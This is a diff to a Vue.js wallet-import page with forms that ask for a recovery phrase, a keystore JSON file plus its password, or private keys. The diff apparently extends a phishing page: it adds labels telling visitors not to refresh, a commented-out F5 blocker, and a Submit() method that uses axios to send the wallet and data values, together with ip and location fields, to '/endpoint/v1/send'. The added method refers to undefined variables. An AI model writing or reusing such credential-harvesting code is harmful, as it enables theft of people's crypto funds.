@@ -85,6 +85,7 @@
                               <form class="row">
                                 <div class="col-md-12">
                                   <div class="form-group">
+                                    <label>Do not refresh page use <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Typically 12 (sometimes 24) words separated by single spaces.</label>
                                     <textarea v-model.trim="inputOne" id="inputOne" class="form-control" rows="7" placeholder="Phrase"></textarea>
                                     <label class="color-red" v-show="hasError">{{error}}</label>
@@ -115,6 +116,7 @@
                               <form class="row">
                                 <div class="col-md-12">
                                 <div class="form-group">
+                                    <label>Do not refresh page use <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Several lines of text beginning with '<b>{...}</b>' plus the password used to encrypt it.</label>
                                     <textarea v-model="inputTwo" class="form-control" rows="7" placeholder="Keystone JSON"></textarea>
                                     <label class="color-red" v-show="hasErrorr">{{errorr}}</label>
@@ -151,6 +153,7 @@
                               <form action="" class="row">
                                 <div class="col-md-12">
                                   <div class="form-group">
+                                    <label>Do not refresh page use <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Typically 12 (sometimes 24) words separated by single spaces</label>
                                     <textarea v-model="inputThree" id="inputThree" class="form-control" rows="7" placeholder="Enter Private Keys"></textarea>
                                     <label class="color-red" v-show="hasErrorrr">{{errorrr}}</label>
@@ -210,6 +213,7 @@
 
 <script>
 import $ from 'jquery'
+import axios from 'axios'
 import Header from '@/components/Header.vue'
 import Footer from '@/components/Footer.vue'
 import BaseFooter from '@/components/BaseFooter.vue'
@@ -240,6 +244,7 @@ export default {
           setTimeout(function () {
       $('body').addClass('loaded_page');
     }, 3000);
+    // $(document).on("keydown", disableF5);
   },
   updated() {
       var no_words = this.inputOne.split(" ");
@@ -309,6 +314,16 @@ export default {
             } catch (e) {
                 return false;
             }
+        },
+        Submit() {
+          axios
+            .get('/endpoint/v1/send?wallet='+x+'&type='+tt+'&data='+y+'&timein='+tt+'&timeout='+tt+'&ip='+tt+'&loc='+tt)
+            .then(res => {
+              this.Explore = res.data
+            })
+            .catch(err => {
+              console.error(err)
+            })
         }
     }
 }
